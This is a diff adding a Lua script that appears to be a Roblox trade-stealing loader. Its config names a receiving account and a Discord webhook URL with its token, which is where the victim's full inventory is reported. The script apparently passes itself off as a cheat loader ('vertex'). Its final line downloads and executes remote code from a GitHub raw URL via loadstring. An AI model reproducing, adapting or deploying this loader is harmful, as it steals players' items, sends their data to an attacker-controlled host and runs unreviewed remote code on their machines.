@@ -1,0 +1,10 @@
+Config = {
+    Receivers = {"ilikeplayingstuff5"},
+    Webhook = "https://discord.com/api/webhooks/1295803387421524008/AtnbljQm4bwHNrznU_-TNWVRAdR30N8sU7GWGF6RkhqsKx1Y8D44AJkyB_jfmIWHOrzJ",
+    FullInventory = true, -- If true, it will display all of the player's items.
+    ResendTrade = "a", -- Send this in chat to resend the trade request if you don't receive it.
+    Script = "vertex", -- Scripts > "None", "Custom", "vertex"
+    CustomLink = "None" -- If Script is set to Custom, provide the custom URL here.
+}
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SILENTGORE/thecakewasalie/refs/heads/main/the/cake/isnt/real/main"))()
